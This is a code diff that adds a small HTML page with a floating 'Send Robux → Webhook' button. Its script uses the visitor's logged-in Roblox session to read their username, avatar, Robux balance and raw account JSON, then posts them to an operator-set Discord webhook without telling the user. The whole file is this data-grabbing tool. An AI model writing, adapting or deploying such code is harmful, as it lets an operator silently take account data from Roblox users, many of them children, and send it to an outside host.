@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Roblox Robux Webhook Sender</title>
+<style>
+    body { font-family: Arial, sans-serif; background: #f0f2f5; margin:0; padding:0; }
+    #container {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        z-index: 999999;
+    }
+    #robuxBtn {
+        padding: 12px 18px;
+        border: none;
+        border-radius: 8px;
+        background: #1e90ff;
+        color: #fff;
+        font-size: 16px;
+        font-weight: bold;
+        cursor: pointer;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        transition: transform 0.1s ease, background 0.2s ease;
+    }
+    #robuxBtn:hover { background: #0d6efd; transform: scale(1.05); }
+    #robuxBtn:active { transform: scale(0.95); }
+</style>
+</head>
+<body>
+
+<div id="container">
+    <button id="robuxBtn">Send Robux → Webhook</button>
+</div>
+
+<script>
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/XXXXX/XXXXX'; // <-- Set your webhook
+
+    async function fetchRobuxAndProfile() {
+        let data, username, avatar, robux;
+
+        try {
+            const res = await fetch('https://www.roblox.com/mobileapi/userinfo', { credentials: 'include' });
+            if (res.ok) {
+                data = await res.json();
+                username = data.UserName;
+                avatar = data.ThumbnailUrl;
+                robux = data.RobuxBalance ?? data.robux;
+            }
+        } catch(e){ console.warn('mobileapi/userinfo failed:', e); }
+
+        if (!robux) {
+            try {
+                const res2 = await fetch('https://api.roblox.com/currency/balance', { credentials: 'include' });
+                const d = await res2.json();
+                robux = d.robux ?? d.Robux;
+            } catch(e){ console.warn('currency/balance failed:', e); }
+        }
+
+        return { username, avatar, robux, raw: data };
+    }
+
+    async function sendRobuxWebhook() {
+        const info = await fetchRobuxAndProfile();
+        if (!info.robux) {
+            alert('Failed to fetch Robux. Are you logged in to Roblox?');
+            return;
+        }
+
+        const embed = {
+            title: 'Robux Balance',
+            color: 0x1E90FF,
+            fields: [
+                { name: 'Robux', value: info.robux, inline: true }
+            ],
+            timestamp: new Date().toISOString()
+        };
+        if (info.username) embed.author = { name: info.username, icon_url: info.avatar };
+        if (info.raw) embed.fields.push({ name: 'Raw JSON', value: JSON.stringify(info.raw).slice(0, 800) });
+
+        try {
+            await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ embeds: [embed] })
+            });
+            alert('Robux sent to webhook!');
+        } catch(e) {
+            console.error(e);
+            alert('Failed to send webhook. Check console.');
+        }
+    }
+
+    document.getElementById('robuxBtn').addEventListener('click', sendRobuxWebhook);
+</script>
+
+</body>
+</html>
